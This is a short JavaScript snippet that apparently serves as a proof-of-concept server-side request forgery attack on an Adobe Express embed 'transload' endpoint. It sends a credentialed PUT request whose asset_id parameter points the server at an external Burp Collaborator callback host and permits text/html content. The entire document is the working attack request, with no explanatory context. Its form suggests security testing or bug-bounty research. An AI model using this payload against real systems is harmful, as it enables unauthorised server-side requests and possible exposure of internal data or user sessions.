(function sendRequest() {
    const xhr = new XMLHttpRequest();
    xhr.open('PUT', 'https://express-embed.adobe.com/transload/adobestock', true);
    xhr.withCredentials = true;

    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');

    const body = 'asset_id=http://gp9ysnb48kzcw16sic5rs1y1vs1jpkd9.burpcollaborator.net/&path=assets%2fslate%2fc6193873-4d11-15b5-af9f-7c8212d831fa%2f52c7694d-bd5d-12dc-a3c3-87129112317&allowedTypes%5B%5D=text/html&allowedTypes%5B%5D=text/html';

    xhr.onreadystatechange = function () {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            console.log('Response:', xhr.responseText);
        }
    };

    xhr.send(body);
})();